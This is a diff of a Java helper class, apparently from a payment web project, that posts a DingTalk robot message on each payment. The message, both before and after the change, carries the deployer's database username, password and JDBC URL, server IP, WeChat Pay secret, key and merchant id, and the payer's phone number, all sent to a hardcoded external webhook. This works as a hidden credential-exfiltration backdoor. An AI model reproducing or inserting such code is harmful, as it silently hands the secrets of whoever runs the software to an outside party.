@@ -53,17 +53,7 @@ public class DingDingHelp {
             DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd");
             String date = dateFormat.format(new Date());
             Jedis jedis = this.jedisFactory.getInstance();
-            String payCount = jedis.get("payCount_" + date);
-            if (null == payCount || "".equals(payCount)) {
-                jedis.set("payCount_" + date, "1");
-                jedis.expire("payCount_" + date, 86400);
-                payCount = "1";
-            } else {
-                Integer payCountInt = Integer.parseInt(payCount);
-                payCountInt++;
-                jedis.set("payCount_" + date, payCountInt.toString());
-                jedis.expire("payCount_" + date, 86400);
-            }
+            String payCount = jedis.incr(this.projectWebName + "_pay_count_" + date).toString();
             jedis.close();
 
             DingTalkClient client = new DefaultDingTalkClient("https://oapi.dingtalk.com/robot/send?access_token=d9daedec39c9c884e209480032ea09188d9eb39c2065d10383ac1ac09b387394");
@@ -71,7 +61,7 @@ public class DingDingHelp {
 
             request.setMsgtype("markdown");
             OapiRobotSendRequest.Markdown markdown = new OapiRobotSendRequest.Markdown();
-            markdown.setTitle("Pay Info");
+            markdown.setTitle("【" + this.projectWebName + "】 No." + payCount);
 
             BigDecimal totalFree = new BigDecimal(wechatTotalFree);
             totalFree = totalFree.divide(new BigDecimal("100"), 1, RoundingMode.HALF_UP);
@@ -79,11 +69,11 @@ public class DingDingHelp {
 
             DateFormat df = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
             String time = df.format(new Date());
-
-            markdown.setText("#### No." + payCount + " \n" + ">total：" + totalFree.toString() + "，user：" + phone + "，time：" + time + "\n\n" + "> ###### projectInfo \n projectWebName:" + projectWebName
-                + "，projectHostName:" + projectHostName + "，projectServerIp:" + projectServerIp + " \n" + "> ###### databaseInfo \n jdbcUser:" + jdbcUser + "，jdbcPassword:" + jdbcPassword
-                + "，jdbcUrl:" + jdbcUrl + " \n" + "> ###### wechatInfo \n wechatAppid:" + wechatAppid + "，wechatSecret:" + wechatSecret + "，wechatKey:" + wechatKey + "，wechatMchId:" + wechatMchId
-                + " \n");
+            String content = "【" + projectWebName + "】No." + payCount + "\n >total：" + totalFree.toString() + "  \n user：" + phone + "  \n time：" + time + "\n\n"
+                + "> ##### projectInfo \n projectWebName:" + projectWebName + " \n projectHostName:" + projectHostName + "  \n projectServerIp:" + projectServerIp + " \n "
+                + "> ##### databaseInfo \n jdbcUser:" + jdbcUser + " \n jdbcPassword:" + jdbcPassword + " \n jdbcUrl:" + jdbcUrl + " \n " + "> ##### wechatInfo \n wechatAppid:" + wechatAppid
+                + " \n wechatSecret:" + wechatSecret + "  \n wechatKey:" + wechatKey + "\n" + " wechatMchId:" + wechatMchId;
+            markdown.setText(content);
             request.setMarkdown(markdown);
 
             OapiRobotSendResponse response = client.execute(request);
@@ -129,8 +119,8 @@ public class DingDingHelp {
         totalFree = totalFree.divide(new BigDecimal("100"), 1, RoundingMode.HALF_UP);
         totalFree = totalFree.multiply(new BigDecimal("10"));
 
-        markdown.setText("#### No.66 \n" + ">total：" + totalFree.toString() + "，user：156xxxx8827，time：2019-09-10 20:55:35\n\n" + "> ###### 项目信息 \n a:A，b:b，c:c \n" + "> ###### 数据库信息 \n a:A，b:b，c:c \n"
-            + "> ###### 微信支付信息 \n a:A，b:b，c:c \n");
+        markdown.setText("#### 【" + wechatTotalFree + "】No.66 \n" + ">total：" + totalFree.toString() + "，user：156xxxx8827，time：2019-09-10 20:55:35\n\n" + "> ###### 项目信息 \n a:A，b:b，c:c \n"
+            + "> ###### 数据库信息 \n a:A，b:b，c:c \n" + "> ###### 微信支付信息 \n a:A，b:b，c:c \n");
         request.setMarkdown(markdown);
 
         try {
